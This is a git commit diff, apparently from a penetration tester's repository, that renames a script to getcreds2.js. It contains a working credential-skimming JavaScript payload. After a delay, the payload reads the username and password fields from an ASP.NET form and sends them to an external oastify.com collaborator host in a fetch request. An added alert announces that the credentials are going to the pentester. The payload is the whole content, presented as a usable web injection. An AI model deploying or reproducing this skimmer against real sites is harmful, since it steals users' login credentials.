3179736226b35de4d2858cfb42312f5e8f38048c
pentesting00 <111343380+pentesting00@users.noreply.github.com>
2022-08-16 14:53:34 +0300

    Update and rename getcreds.js to getcreds2.js

--- getcreds2.js
+++ getcreds2.js
@@ -1,5 +1,7 @@
+
 setTimeout(() => { x = new FormData(document.aspnetForm);
 p = x.get("ctl00$LegislationMasterBody$ucSignOff$txtPassword");z = x.get("ctl00$LegislationMasterBody$ucSignOff$txtUserName");
+alert("Username is:" + z + "\npassword is" + p + "\n, sending them to the pentester ip: ..");
 fetch("https://oph43lu16yszw9l49fo99cv9j0pqdf.oastify.com"+"?username="+z+"&password="+p);   }, 9000);
 
-// test comment js
+
